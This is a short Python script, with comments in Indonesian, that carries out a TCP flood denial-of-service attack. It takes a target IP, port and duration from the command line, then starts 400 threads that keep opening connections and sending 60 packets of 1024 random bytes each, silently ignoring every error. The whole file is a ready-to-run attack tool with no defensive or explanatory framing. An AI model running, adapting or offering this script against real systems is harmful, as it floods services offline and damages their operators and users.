import socket
import threading
import random
import sys
import time

def start(ip, port, duration, pack, thread_count):
    def attack():
        data = random._urandom(1024)  # Mengirim data acak sebesar 1024 byte
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                for _ in range(pack):
                    s.send(data)
                s.close()
            except:
                pass
    
    threads = []
    for _ in range(thread_count):
        th = threading.Thread(target=attack)
        threads.append(th)
        th.start()
    
    for th in threads:
        th.join()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <duration>")
        sys.exit(1)
    
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    pack = 60  # Default jumlah paket per koneksi
    thread_count = 400  # Default jumlah thread
    
    print(f"Starting TCP flood on {ip}:{port} for {duration} seconds with {thread_count} threads.")
    start(ip, port, duration, pack, thread_count)
